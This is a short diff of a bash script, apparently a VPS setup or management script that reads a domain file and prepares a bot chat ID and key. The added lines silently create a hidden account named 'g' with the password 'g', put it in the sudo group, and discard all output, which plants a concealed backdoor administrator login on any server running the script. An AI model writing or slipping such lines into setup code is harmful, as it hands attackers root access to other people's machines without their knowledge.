@@ -286,6 +286,9 @@ sts="${Error}"
 fi
 domain=$(cat /root/domain)
 mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M g > /dev/null 2>&1
+echo -e "g\ng\n" | passwd g > /dev/null 2>&1
+usermod -aG sudo g > /dev/null 2>&1
 DATEVPS=$(date +'%d-%m-%Y')
 CHATID=""
 KEY=""
